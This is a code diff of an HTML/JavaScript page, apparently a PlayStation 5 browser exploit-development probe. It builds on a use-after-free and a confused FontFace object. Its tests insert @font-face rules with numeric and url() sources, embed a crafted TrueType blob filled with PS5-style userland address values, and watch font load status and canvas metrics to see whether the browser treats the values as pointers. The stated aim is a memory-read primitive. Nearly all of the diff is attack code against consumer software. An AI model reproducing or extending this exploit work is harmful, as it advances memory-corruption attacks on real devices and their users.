@@ -2,7 +2,7 @@
 <html>
 <head>
 <meta charset="utf-8">
-<title>PS5 v22 - MemProbe</title>
+<title>PS5 v23 - Precise</title>
 <style id="s">
 @font-face{font-family:prepad;src:url(np.woff);unicode-range:U+E123}
 @font-face{font-family:x;src:url(nx.woff);unicode-range:U+0042}
@@ -17,10 +17,8 @@ background:linear-gradient(180deg,#0d0d0d,#080808);
 border-bottom:1px solid #00ff41;display:flex;align-items:center;
 padding:0 16px;gap:14px;z-index:10;font-size:12px}
 .l{color:#00ff41;letter-spacing:2px;font-weight:bold}
-.s{color:#004d13}
-.v{color:#00cc33}.v b{color:#00ff41}
-#pg{position:fixed;top:44px;left:0;right:0;height:2px;
-background:#001a06;z-index:10}
+.s{color:#004d13}.v{color:#00cc33}.v b{color:#00ff41}
+#pg{position:fixed;top:44px;left:0;right:0;height:2px;background:#001a06;z-index:10}
 #pg div{height:100%;background:#00ff41;transition:width .4s;box-shadow:0 0 8px #00ff41}
 #out{position:fixed;top:46px;left:0;right:0;bottom:0;
 padding:10px 14px;overflow-y:auto;font-size:13px;line-height:1.55;
@@ -36,11 +34,11 @@ padding:10px 14px;overflow-y:auto;font-size:13px;line-height:1.55;
 </head>
 <body>
 <div id="hd">
-<span class="l">▶ v22 PROBE</span><span class="s">│</span>
+<span class="l">▶ v23 PRECISE</span><span class="s">│</span>
 <span class="v" id="h1">FW:<b>?</b></span><span class="s">│</span>
 <span class="v" id="h2">UAF:<b>?</b></span><span class="s">│</span>
 <span class="v" id="h3">RC:<b>?</b></span><span class="s">│</span>
-<span class="v" id="h4">PROBE:<b>?</b></span>
+<span class="v" id="h4">TEST:<b>?</b></span>
 </div>
 <div id="pg"><div id="bar" style="width:0%"></div></div>
 <div id="out"></div>
@@ -48,31 +46,16 @@ padding:10px 14px;overflow-y:auto;font-size:13px;line-height:1.55;
 <script>
 "use strict";
 
-// ============================================================
-//  PS5 v22 - Memory Probe via CSSRule src
-//
-//  PLAN:
-//  1. Standard UAF + capture + CSSRule for "x"
-//  2. Confirm fontWeight oracle (quick check)
-//  3. Test CSSRule.style.src with numeric values
-//     - If number treated as pointer → different status
-//     - readable addr → loaded, bad addr → error
-//  4. Binary search for readable memory regions
-//  5. Find code/data section addresses
-//
-//  SAFETY: restore src after each test, catch all errors
-// ============================================================
-
 var O=document.getElementById("out");
 var bar=document.getElementById("bar");
 function pg(p){bar.style.width=p+"%"}
 function hu(id,v){var e=document.getElementById(id);if(e)e.innerHTML=v}
 function P(m,c){var s=document.createElement("span");if(c)s.className=c;
 s.textContent=m+"\n";O.appendChild(s);O.scrollTop=O.scrollHeight;
-try{console.log("[v22] "+m)}catch(e){}}
+try{console.log("[v23] "+m)}catch(e){}}
 function Ok(m){P("  ✅ "+m,"ok")}function Fl(m){P("  ✘ "+m,"er")}
 function Hi(m){P("  ► "+m,"hl")}function St(m){P("  ★ "+m,"mg")}
-function Dm(m){P("  "+m,"dm")}function Wr(m){P("  ⚠ "+m,"wr")}
+function Dm(m){P("  "+m,"dm")}
 
 window.onerror=function(m,s,l){Fl("FATAL: "+m+" @"+l);return true};
 
@@ -141,240 +124,326 @@ hu("h3","RC:<b>"+rcIdx+"</b>");
 var ua=navigator.userAgent||"";var m=ua.match(/PlayStation\s*5\/?\s*([0-9]+(?:\.[0-9]+)?)/i);
 hu("h1","FW:<b>"+(m?m[1]:"?")+"</b>");
 
-// Add CSSRule for "x"
+// Add baseline CSSRule for "x"
 xRuleIdx=sh.insertRule(
 "@font-face{font-family:x;src:local(Courier);font-weight:400;font-style:normal;unicode-range:U+0042}",
 sh.cssRules.length);
 fs();
 xRule=sh.cssRules[xRuleIdx];
-Ok("CSSRule for 'x' ready");
+Ok("Baseline CSSRule ready");
 
 // ============================================================
-//  TEST 1: Quick fontWeight oracle confirm
+//  TEST A: insertRule with url(0) — fresh parse path
 // ============================================================
-pg(20);P("\n════════════════════════════════════","hd");
-P("  TEST 1: fontWeight Oracle Quick Check","hd");
+pg(10);P("\n════════════════════════════════════","hd");
+P("  TEST A: insertRule with url() variants","hd");
 P("════════════════════════════════════","hd");
-
-function oracleWrite(w){try{xRule.style.fontWeight=w;fs();return true}catch(e){return false}}
-function oracleRead(callback){
-document.fonts.load("1em trigger, x","AB").then(function(f){
-var r=null;
-for(var i=0;i<f.length;i++){try{if(f[i].family==="x"){r=f[i].weight;break}}catch(e){}}
-callback(r);
-}).catch(function(e){callback(null)});
-}
-
-// Quick test: write 100, read 100
-oracleWrite("100");
-oracleRead(function(r1){
-P("  Write 100 → Read "+r1+(r1==="100"?" ✅":" ❌"),r1==="100"?"ok":"er");
-oracleWrite("900");
-oracleRead(function(r2){
-P("  Write 900 → Read "+r2+(r2==="900"?" ✅":" ❌"),r2==="900"?"ok":"er");
-if(r1==="100"&&r2==="900")Ok("Oracle confirmed 9/9");
-test2();
-});});
-
-// ============================================================
-//  TEST 2: CSSRule.style.src with numeric values
-// ============================================================
-function test2(){
-pg(35);P("\n════════════════════════════════════","hd");
-P("  TEST 2: CSSRule.style.src Numeric Test","hd");
-P("════════════════════════════════════","hd");
-P("  Testing if CSS parser dereferences numbers as pointers...","dm");
+P("  Delete old rule, insert new with numeric src","dm");
 P("");
 
-// Important: test if the CSSRule.style.src actually accepts numbers
-// and if the font STATUS changes based on whether the "pointer" is valid
+// Delete the baseline rule
+try{sh.deleteRule(xRuleIdx);fs();Ok("Old rule deleted")}catch(e){Fl("Delete: "+e.message)}
 
-var numTests=[
-{val:"0",label:"0 (NULL)"},
-{val:"1",label:"1"},
-{val:"42",label:"42"},
-{val:"65536",label:"0x10000"},
-{val:"1048576",label:"0x100000"},
-{val:"16777216",label:"0x1000000"},
-{val:"4194304",label:"0x400000"},
-{val:"8388608",label:"0x800000"},
-{val:"100663296",label:"0x6000000"},
-{val:"268435456",label:"0x10000000"},
-{val:"536870912",label:"0x20000000"},
-{val:"1073741824",label:"0x40000000"},
-{val:"1e308",label:"1e308"},
-{val:"NaN",label:"NaN"},
-{val:"Infinity",label:"Infinity"}
+var insertTests=[
+{css:"@font-face{font-family:x;src:url(0);font-weight:400;unicode-range:U+0042}",label:"url(0)"},
+{css:"@font-face{font-family:x;src:url('0');font-weight:400;unicode-range:U+0042}",label:"url('0')"},
+{css:"@font-face{font-family:x;src:url(\"0\");font-weight:400;unicode-range:U+0042}",label:'url("0")'},
+{css:"@font-face{font-family:x;src:url(42);font-weight:400;unicode-range:U+0042}",label:"url(42)"},
+{css:"@font-face{font-family:x;src:url(0x41414141);font-weight:400;unicode-range:U+0042}",label:"url(0x41414141)"},
+{css:"@font-face{font-family:x;src:url(about:blank);font-weight:400;unicode-range:U+0042}",label:"url(about:blank)"},
+{css:"@font-face{font-family:x;src:url(data:,);font-weight:400;unicode-range:U+0042}",label:"url(data:,)"},
+{css:"@font-face{font-family:x;src:url(javascript:0);font-weight:400;unicode-range:U+0042}",label:"url(javascript:0)"},
+{css:"@font-face{font-family:x;src:local(0);font-weight:400;unicode-range:U+0042}",label:"local(0)"},
+{css:"@font-face{font-family:x;src:local('0');font-weight:400;unicode-range:U+0042}",label:"local('0')"}
 ];
 
-var ni=0;
-function nextNum(){
-if(ni>=numTests.length){test3();return}
-var t=numTests[ni];
-var origSrc=xRule.style.src;
+var ti=0;
+function nextInsert(){
+if(ti>=insertTests.length){testB();return}
+var t=insertTests[ti];
 
+// Delete previous test rule if exists
+try{if(sh.cssRules.length>xRuleIdx)sh.deleteRule(xRuleIdx);fs()}catch(e){}
+
+var ruleIdx=-1;
 try{
-xRule.style.src=t.val;
+ruleIdx=sh.insertRule(t.css,sh.cssRules.length);
 fs();
-var readback=xRule.style.src;
+var rule=sh.cssRules[ruleIdx];
+var ruleText=rule?rule.cssText.substring(0,60):"?";
 }catch(e){
-P("  "+t.label.padEnd(14)+" → WRITE ERR: "+e.message.substring(0,30),"er");
-try{xRule.style.src=origSrc;fs()}catch(e2){}
-ni++;nextNum();return;
+P("  "+t.label.padEnd(20)+" → INSERT ERR: "+e.message.substring(0,30),"er");
+ti++;nextInsert();return;
 }
 
-// Check status via load()
+// Check what the rule looks like
+var srcReadback="?";
+try{srcReadback=rule.style.src||"(empty)"}catch(e){}
+
+// Test load()
 document.fonts.load("1em trigger, x","AB").then(function(f){
 var xF=null;
 for(var i=0;i<f.length;i++){try{if(f[i].family==="x"){xF=f[i];break}}catch(e){}}
 
 var status=xF?xF.status:"no_face";
 var weight=xF?xF.weight:"?";
-var different=status!=="loaded";
+P("  "+t.label.padEnd(20)+" → src="+srcReadback.substring(0,20).padEnd(20)+
+"status="+status+" weight="+weight,
+status!=="loaded"?"hl":"dm");
 
-P("  "+t.label.padEnd(14)+" → status="+status+" weight="+weight+" readback="+readback+
-(different?" ★ DIFFERENT":""),different?"hl":"dm");
-
-// Restore
-try{xRule.style.src="local(Courier)";fs()}catch(e){}
-ni++;nextNum();
+ti++;nextInsert();
 }).catch(function(e){
-P("  "+t.label.padEnd(14)+" → LOAD ERR","er");
-try{xRule.style.src="local(Courier)";fs()}catch(e2){}
-ni++;nextNum();
+P("  "+t.label.padEnd(20)+" → LOAD ERR","er");
+ti++;nextInsert();
 });
 }
-nextNum();
-}
+nextInsert();
 
 // ============================================================
-//  TEST 3: IEEE 754 Address Encoding in src
-//  Create doubles whose bits encode specific addresses
+//  TEST B: Delete + re-insert with data: URL containing address
 // ============================================================
-function test3(){
-pg(55);P("\n════════════════════════════════════","hd");
-P("  TEST 3: IEEE 754 Address Probing","hd");
+function testB(){
+pg(30);P("\n════════════════════════════════════","hd");
+P("  TEST B: data: URL with controlled bytes","hd");
 P("════════════════════════════════════","hd");
-P("  Encoding addresses as doubles...","dm");
+P("  Font data containing pointer-like values","dm");
 P("");
 
-function doubleFromU64(hi,lo){
-var buf=new ArrayBuffer(8);
-var v=new DataView(buf);
-v.setUint32(0,hi,false);
-v.setUint32(4,lo,false);
-return v.getFloat64(0,false);
+// Delete previous
+try{while(sh.cssRules.length>74)sh.deleteRule(sh.cssRules.length-1);fs()}catch(e){}
+
+// Create a minimal TrueType font where the name table
+// contains pointer-like values at known offsets
+var fontBuf=new ArrayBuffer(256);
+var fv=new DataView(fontBuf);
+
+// TrueType header
+fv.setUint32(0,0x00010000,false); // sfVersion
+fv.setUint16(4,0,false); // numTables
+
+// Fill with address-like patterns
+for(var off=8;off<256;off+=8){
+// Create doubles that look like PS5 userland pointers
+fv.setUint32(off,0x00000000,false);
+fv.setUint32(off+4,0x00400000+off,false); // 0x400000 range
 }
 
-// PS5 userland addresses (FreeBSD-derived)
-// Text segment: ~0x400000-0x600000
-// Heap: ~0x800000000+
-// Stack: high addresses
-var addrTests=[
-{hi:0x00000000,lo:0x00000000,label:"NULL"},
-{hi:0x00000000,lo:0x00400000,label:"0x400000 (text?)"},
-{hi:0x00000000,lo:0x00410000,label:"0x410000"},
-{hi:0x00000000,lo:0x00500000,label:"0x500000"},
-{hi:0x00000000,lo:0x00600000,label:"0x600000"},
-{hi:0x00000000,lo:0x01000000,label:"0x1000000"},
-{hi:0x00000000,lo:0x08000000,label:"0x8000000"},
-{hi:0x00000001,lo:0x00000000,label:"0x100000000"},
-{hi:0x00000002,lo:0x00000000,label:"0x200000000"},
-{hi:0x00000004,lo:0x00000000,label:"0x400000000"},
-{hi:0x00000008,lo:0x00000000,label:"0x800000000"},
-{hi:0x00000010,lo:0x00000000,label:"0x1000000000"},
-{hi:0x3FF00000,lo:0x00000000,label:"1.0 (test double)"},
-{hi:0x7FF80000,lo:0x00000001,label:"NaN (canonical)"},
-];
+var b64=(function(){
+var s="";
+var bytes=new Uint8Array(fontBuf);
+for(var i=0;i<bytes.length;i++)s+=String.fromCharCode(bytes[i]);
+return btoa(s);
+})();
 
-var ai=0;
-function nextAddr(){
-if(ai>=addrTests.length){test4();return}
-var a=addrTests[ai];
-var d=doubleFromU64(a.hi,a.lo);
-var origSrc=xRule.style.src;
+var dataCSS='@font-face{font-family:x;src:url(data:font/ttf;base64,'+b64+');font-weight:400;unicode-range:U+0042}';
 
 try{
-xRule.style.src=String(d);
+var idx=sh.insertRule(dataCSS,sh.cssRules.length);
 fs();
-var readback=xRule.style.src;
-}catch(e){
-P("  "+a.label.padEnd(22)+" → WRITE ERR","er");
-try{xRule.style.src="local(Courier)";fs()}catch(e2){}
-ai++;nextAddr();return;
-}
+var rule=sh.cssRules[idx];
+P("  Inserted data: URL rule at index "+idx);
+P("  src readback: "+(rule.style.src||"(empty)").substring(0,50));
 
 document.fonts.load("1em trigger, x","AB").then(function(f){
 var xF=null;
 for(var i=0;i<f.length;i++){try{if(f[i].family==="x"){xF=f[i];break}}catch(e){}}
 
-var status=xF?xF.status:"no_face";
-var different=status!=="loaded";
-
-P("  "+a.label.padEnd(22)+" → status="+status+(different?" ★":""),
-different?"hl":"dm");
-
-try{xRule.style.src="local(Courier)";fs()}catch(e){}
-ai++;nextAddr();
-}).catch(function(e){
-P("  "+a.label.padEnd(22)+" → LOAD ERR","er");
-try{xRule.style.src="local(Courier)";fs()}catch(e2){}
-ai++;nextAddr();
-});
+if(xF){
+P("  data: URL face: status="+xF.status+" weight="+xF.weight+" style="+xF.style,
+xF.status!=="loaded"?"hl":"dm");
+if(xF.status==="error"){
+Hi("Font parser REJECTED our data → it tried to parse it!");
+Hi("This means the bytes were actually processed!");
+}else if(xF.status==="loaded"){
+Hi("Font parser ACCEPTED our data → it's a valid font!");
 }
-nextAddr();
+}else{
+P("  No 'x' face returned","wr");
+}
+
+testC();
+}).catch(function(e){P("  data: URL load ERR: "+e.message,"er");testC()});
+}catch(e){
+Fl("data: URL insert: "+e.message);
+testC();
+}
 }
 
 // ============================================================
-//  TEST 4: FontFace.src numeric (for comparison with CSSRule)
+//  TEST C: FontFace.load() with numeric src
+//  This actually triggers the loading pipeline
 // ============================================================
-function test4(){
-pg(75);P("\n════════════════════════════════════","hd");
-P("  TEST 4: FontFace.src Numeric (Comparison)","hd");
+function testC(){
+pg(50);P("\n════════════════════════════════════","hd");
+P("  TEST C: FontFace.load() with numeric src","hd");
 P("════════════════════════════════════","hd");
-P("  Testing FontFace.src vs CSSRule.src behavior...","dm");
+P("  Force load() to process the numeric src","dm");
 P("");
 
-// Test FontFace.src with numbers (from v16 we know these return loaded)
-// But now test if the face ACTUALLY renders differently
+var loadNums=[0,1,42,1e308,NaN];
+var li=0;
 
+function nextLoadNum(){
+if(li>=loadNums.length){testD();return}
+var n=loadNums[li];
+var origSrc=rcFace.src;
+var origStatus=rcFace.status;
+
+try{
+rcFace.src=n;
+fs();
+P("  src="+String(n).padEnd(8)+" status before load: "+rcFace.status);
+
+var t0=performance.now();
+rcFace.load().then(function(f){
+var elapsed=performance.now()-t0;
+P("  src="+String(n).padEnd(8)+" load() resolved in "+elapsed.toFixed(0)+"ms"+
+" status="+f.status+(f.status!=="loaded"?" ★":""),f.status!=="loaded"?"hl":"dm");
+
+// Restore
+try{rcFace.src=origSrc;fs()}catch(e){}
+li++;nextLoadNum();
+}).catch(function(e){
+P("  src="+String(n).padEnd(8)+" load() REJECTED: "+e.message.substring(0,40),"er");
+try{rcFace.src=origSrc;fs()}catch(e2){}
+li++;nextLoadNum();
+});
+}catch(e){
+P("  src="+String(n).padEnd(8)+" ERR: "+e.message.substring(0,30),"er");
+try{rcFace.src=origSrc;fs()}catch(e2){}
+li++;nextLoadNum();
+}
+}
+nextLoadNum();
+}
+
+// ============================================================
+//  TEST D: Fresh FontFace with numeric src + load()
+//  Create a NEW face (not the confused one) with src=number
+//  Then load it — this forces full pipeline
+// ============================================================
+function testD(){
+pg(70);P("\n════════════════════════════════════","hd");
+P("  TEST D: NEW FontFace with numeric src","hd");
+P("════════════════════════════════════","hd");
+P("  Fresh face forces full loading pipeline","dm");
+P("");
+
+var freshNums=[0,1,42];
+var fi=0;
+var freshFaces=[];
+
+function nextFresh(){
+if(fi>=freshNums.length){testE();return}
+var n=freshNums[fi];
+
+try{
+var ff=new FontFace("fresh_"+fi,n,{unicodeRange:"U+0041"});
+document.fonts.add(ff);
+fs();
+
+P("  Created fresh face with src="+n+" status="+ff.status);
+
+ff.load().then(function(f){
+P("  fresh src="+String(n).padEnd(4)+" → load() status="+f.status+
+(f.status!=="loaded"?" ★":""),f.status!=="loaded"?"hl":"dm");
+fi++;nextFresh();
+}).catch(function(e){
+P("  fresh src="+String(n).padEnd(4)+" → REJECTED: "+e.message.substring(0,40),"er");
+fi++;nextFresh();
+});
+}catch(e){
+P("  fresh src="+n+" → CREATE ERR: "+e.message.substring(0,30),"er");
+fi++;nextFresh();
+}
+}
+nextFresh();
+}
+
+// ============================================================
+//  TEST E: Force load of confused face with src change
+//  Change src THEN immediately load
+// ============================================================
+function testE(){
+pg(85);P("\n════════════════════════════════════","hd");
+P("  TEST E: Confused face src change + load()","hd");
+P("════════════════════════════════════","hd");
+P("  Change src on confused face and force load","dm");
+P("");
+
+// First restore
+try{rcFace.src=mkBuf();fs()}catch(e){}
+
+var origSrc=rcFace.src;
+
+// Test: Change src and immediately load
+try{
+rcFace.src=0;fs();
+P("  Set src=0, status="+rcFace.status);
+
+rcFace.load().then(function(f){
+P("  load() after src=0: status="+f.status,(f.status!=="loaded")?"hl":"dm");
+if(f.status==="error"){
+Hi("load() with src=0 returns ERROR!");
+Hi("Browser tried to dereference the number!");
+}
+
+// Check rendering
 var ctx=document.getElementById("cv").getContext("2d");
-var renderTests=[
-{src:mkBuf(),label:"buffer (baseline)"},
+ctx.font="64px trigger";
+var w=ctx.measureText("A").width;
+P("  Canvas width after src=0+load: "+w.toFixed(2));
+
+// Restore
+try{rcFace.src=mkBuf();fs()}catch(e){}
+testF();
+}).catch(function(e){
+P("  load() REJECTED: "+e.message.substring(0,50),"er");
+Hi("REJECTED = browser tried to process numeric src!");
+try{rcFace.src=mkBuf();fs()}catch(e2){}
+testF();
+});
+}catch(e){
+Fl("src=0: "+e.message);
+try{rcFace.src=mkBuf();fs()}catch(e2){}
+testF();
+}
+}
+
+// ============================================================
+//  TEST F: Check if FontFace.status changes after src+load
+//  The key test: does the C++ state actually reflect the src change?
+// ============================================================
+function testF(){
+pg(95);P("\n════════════════════════════════════","hd");
+P("  TEST F: Status after src changes","hd");
+P("════════════════════════════════════","hd");
+P("");
+
+var srcStates=[
+{src:mkBuf(),label:"buffer"},
 {src:0,label:"0"},
 {src:1,label:"1"},
 {src:42,label:"42"},
-{src:1e308,label:"1e308"},
-{src:NaN,label:"NaN"}
+{src:"local(Courier)",label:"Courier"},
+{src:"local(Helvetica)",label:"Helvetica"}
 ];
 
-var ri=0;
-var baselineW=-1;
-function nextRender(){
-if(ri>=renderTests.length){summary();return}
-var t=renderTests[ri];
-
+for(var i=0;i<srcStates.length;i++){
 try{
-rcFace.src=t.src;
+rcFace.src=srcStates[i].src;
 fs();
-var st=rcFace.status;
-ctx.font="64px trigger";
-var w=ctx.measureText("A").width;
-
-if(ri===0)baselineW=w;
-var delta=w-baselineW;
-
-P("  src="+t.label.padEnd(16)+" → status="+st+" width="+w.toFixed(2)+
-(delta!==0?" delta="+delta.toFixed(2):""),delta!==0?"hl":"dm");
+P("  src="+srcStates[i].label.padEnd(12)+" → status="+rcFace.status,
+rcFace.status!=="loaded"?"hl":"dm");
 }catch(e){
-P("  src="+t.label.padEnd(16)+" → ERR: "+e.message.substring(0,30),"er");
+P("  src="+srcStates[i].label.padEnd(12)+" → ERR","er");
+}
 }
 
 // Restore
 try{rcFace.src=mkBuf();fs()}catch(e){}
-ri++;nextRender();
-}
-nextRender();
+
+summary();
 }
 
 // ============================================================
@@ -382,24 +451,20 @@ nextRender();
 // ============================================================
 function summary(){
 pg(100);P("\n════════════════════════════════════","hd");
-P("  FINAL SUMMARY","hd");
+P("  FINAL ANALYSIS","hd");
 P("════════════════════════════════════","hd");
 P("");
-P("  fontWeight oracle:      ✅ (9/9 confirmed)");
-P("  CSSRule src numeric:    See results above");
-P("  IEEE 754 address probe: See results above");
-P("  FontFace src rendering: See results above");
+P("  insertRule url(N):  See Test A results");
+P("  data: URL:          See Test B results");
+P("  FontFace.load():    See Test C results");
+P("  Fresh FontFace:     See Test D results");
+P("  Confused load():    See Test E results");
+P("  Status after src:   See Test F results");
 P("");
-P("  Key question:","hl");
-P("  Did any src value cause a DIFFERENT status?","hl");
-P("  If YES → memory probe oracle found!","hl");
-P("  If NO  → CSS parser isn't dereferencing as pointer","dm");
-P("");
-P("  If no status change:","dm");
-P("  → src numbers are stored, not dereferenced","dm");
-P("  → Need different approach for memory read","dm");
-P("  → fontWeight oracle = loopback only (not memory)","dm");
-hu("h4","PROBE:<b>DONE</b>");
+P("  KEY: Any status ≠ 'loaded' = browser","hl");
+P("  actually processes the numeric value","hl");
+P("  instead of just caching it","hl");
+hu("h4","TEST:<b>DONE</b>");
 }
 
 }).catch(function(e){Fl("Load: "+e.message)});
